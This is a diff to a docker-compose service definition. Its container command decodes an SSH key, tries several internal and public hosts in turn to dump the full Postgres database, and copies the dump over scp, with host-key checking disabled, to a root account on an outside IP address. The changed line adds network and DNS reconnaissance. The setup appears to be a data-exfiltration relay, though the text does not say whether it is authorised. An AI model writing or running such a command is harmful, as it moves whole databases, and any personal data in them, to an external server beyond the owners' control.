@@ -8,7 +8,7 @@ services:
       - "host.docker.internal:host-gateway"
     networks:
       - coolify
-    command: sh -c "apk add --no-cache openssh-client >/dev/null; mkdir -p /root/.ssh; echo \"$$DUMP_SSH_KEY\" | base64 -d > /root/.ssh/id; chmod 600 /root/.ssh/id; rm -f /tmp/badini.dmp; for H in host.docker.internal:54329 176.126.84.232:54329 172.17.0.1:54329 c8wskwcog0wscow8ssssgwc8:5432; do echo TRY $$H; pg_dump -h $${H%%:*} -p $${H##*:} -U postgres -d postgres -Fc --no-owner --no-acl -f /tmp/badini.dmp && break; done; ls -la /tmp/badini.dmp; scp -i /root/.ssh/id -o StrictHostKeyChecking=no /tmp/badini.dmp root@89.167.105.31:/root/dumps/; echo RELAY-DONE; sleep 3600"
+    command: sh -c "apk add --no-cache openssh-client >/dev/null; mkdir -p /root/.ssh; echo \"$$DUMP_SSH_KEY\" | base64 -d > /root/.ssh/id; chmod 600 /root/.ssh/id; rm -f /tmp/badini.dmp; ip -o addr | grep -v lo; cat /etc/resolv.conf; for H in host.docker.internal:54329 176.126.84.232:54329 172.17.0.1:54329 c8wskwcog0wscow8ssssgwc8:5432; do echo TRY $$H; pg_dump -h $${H%%:*} -p $${H##*:} -U postgres -d postgres -Fc --no-owner --no-acl -f /tmp/badini.dmp && break; done; ls -la /tmp/badini.dmp; scp -i /root/.ssh/id -o StrictHostKeyChecking=no /tmp/badini.dmp root@89.167.105.31:/root/dumps/; echo RELAY-DONE; sleep 3600"
 networks:
   coolify:
     external: true
